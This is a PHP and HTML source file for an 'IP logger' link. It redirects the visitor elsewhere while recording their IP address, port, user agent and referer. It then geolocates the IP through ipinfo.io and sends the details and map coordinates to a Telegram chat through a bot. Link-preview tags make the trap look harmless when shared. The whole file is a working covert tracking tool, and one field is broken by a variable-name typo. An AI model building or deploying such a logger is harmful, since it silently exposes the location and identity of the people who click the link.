<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Simple IP logger</title>
    <!--DATOS-->
    <meta property="og:title" content="Ip logger" />
    <meta property="og:description" content="Followme in Github" />
    <meta property="og:image" content="banner.png" />
</head>
</html>

<?php

	require('config.php');
	require('functions.php');
	header('Location: '.redirect_url);
	date_default_timezone_set('America/Lima');

	$fecha = date('h:i A')." - ".date('d/m/y');

	$iplog = @get_client_ip_server();
	$pag_referer = $_SERVER['HTTP_REFERER'];
	$remot_port = $_SERVER['REMOTE_PORT'];
	$ua = $_SERVER['HTTP_USER_AGENT'];

	// Get info from the IP
	$ipInfo = json_decode(file_get_contents('https://ipinfo.io/'.$iplog.'/json'), true);
	$city = $ipInfo['city'];
	$region = $ipInfo['region'];
	$country = $ipInfo['country'];
	$timezone = $ipinfo['timezone'];
	$isp = $ipInfo['org'];
	$loc = explode(',', $ipInfo['loc']);

	$msg = "<b>IP:PORT: <code>".$iplog.":".$remot_port."</code>\nUser-agent: <code>".$ua."</code>\nPagReferer: <code>".$pag_referer."</code>\nISP: <code>".$isp."</code>\nCountry:</b> <code>".$country."</code>";

	send_msg(chat_id, $msg);
	
	bot('sendVenue', [
		'chat_id' => chat_id,
		'latitude' => $loc[0],
		'longitude' => $loc[1],
		'title' => 'IP location ➜ '.$iplog,
		'address' => $city." - ".$region." - ".$country,
	]);


?>